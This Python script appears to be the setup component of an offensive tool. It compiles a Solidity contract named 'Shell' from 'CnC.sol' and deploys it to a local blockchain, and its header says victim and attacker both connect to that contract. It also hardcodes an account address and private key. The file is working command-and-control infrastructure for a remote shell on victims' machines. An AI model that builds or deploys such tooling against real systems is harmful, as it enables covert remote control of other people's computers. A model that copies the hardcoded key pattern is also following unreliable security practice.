## Name        : RBCS_Init.py
## Date        : 5.3.2022
## Author      : Shakedash
## Description : This program will create a smart contract to connect to from the victim and attacker.
##               The program will print the address of the contract.
##               Be sure to insert the address to the CONTRACT_ADDRESS variable in both files.
##               Also, keep in mind that the address deploying needs to be the same as the address using the server (attacker).
##               And the victim address needs to be different.

# Imports.
from asyncio.windows_events import NULL
from solcx import compile_standard
import json
from web3 import Web3

# Constants.
SOLIDITY_VERSION = "0.6.0"
CONTRACT_NAME = "Shell"
CONTRACT_FILE_PATH = "CnC.sol"
COMPILED_CONTRACT_PATH = "CompiledContract.json"
RPC_URL = "HTTP://127.0.0.1:7545"
CHAIN_ID = 1337
ACCOUNT_ADDR = "0x6094A92Db36BCb533a40357b0E4274dE624AAea6"
PRIVATE_KEY = "0xed9754ec971cf055a38b847a2f7ed4bb4033c46477b573fe31f8563c465632f3"

# Main
def main():

    # Compile contract.
    compiled_contract = CompileContrat(CONTRACT_FILE_PATH)

    # Dump the compiled contract into a json and get the abi and bytecode out of it.
    ExportContract(compiled_contract, COMPILED_CONTRACT_PATH)
    bytecode = compiled_contract["contracts"][CONTRACT_FILE_PATH][CONTRACT_NAME]["evm"][
        "bytecode"
    ]["object"]
    abi = compiled_contract["contracts"][CONTRACT_FILE_PATH][CONTRACT_NAME]["abi"]

    # Initialize the web3 provider object.
    w3_engine = Web3(Web3.HTTPProvider(RPC_URL))

    # Deploy the contract on the network using web3.
    DiffCoinContract_forDeployment = w3_engine.eth.contract(abi=abi, bytecode=bytecode)
    DeployTx = w3_engine.eth.account.sign_transaction(
        DiffCoinContract_forDeployment.constructor().buildTransaction(
            {
                "gasPrice": w3_engine.eth.gas_price,
                "chainId": CHAIN_ID,
                "from": ACCOUNT_ADDR,
                "nonce": w3_engine.eth.getTransactionCount(ACCOUNT_ADDR),
            }
        ),
        PRIVATE_KEY,
    )
    success = False
    while not success:
        try:
            tx_hash = w3_engine.eth.send_raw_transaction(DeployTx.rawTransaction)
            tx_receipt = w3_engine.eth.wait_for_transaction_receipt(tx_hash)
            success = True
        except:
            pass
    print(f"Contract Address: {tx_receipt.contractAddress}")


# ExportContract exports the compiled contract to a json.
def ExportContract(compiled_contract, path):
    compiled_file = open(path, "w")
    json.dump(compiled_contract, compiled_file)
    bytecode = compiled_contract["contracts"][CONTRACT_FILE_PATH][CONTRACT_NAME]["evm"][
        "bytecode"
    ]["object"]
    abi = compiled_contract["contracts"][CONTRACT_FILE_PATH][CONTRACT_NAME]["abi"]
    print(abi)


# This function gets a path to a solidity smart contract and upload it to the blockchain.
def CompileContrat(contractpath):

    # Read the contract code from the file.
    contractfile = open(contractpath, "r")
    SmartContractCode = contractfile.read()

    # Compile the contract using this crazy motherfucking function.
    CompiledContract = compile_standard(
        {
            "language": "Solidity",
            "sources": {contractpath: {"content": SmartContractCode}},
            "settings": {
                "outputSelection": {
                    "*": {"*": ["abi", "metadata", "evm.bytecode", "evm.sourceMap"]}
                }
            },
        },
        solc_version=SOLIDITY_VERSION,
    )
    return CompiledContract


if __name__ == "__main__":
    main()
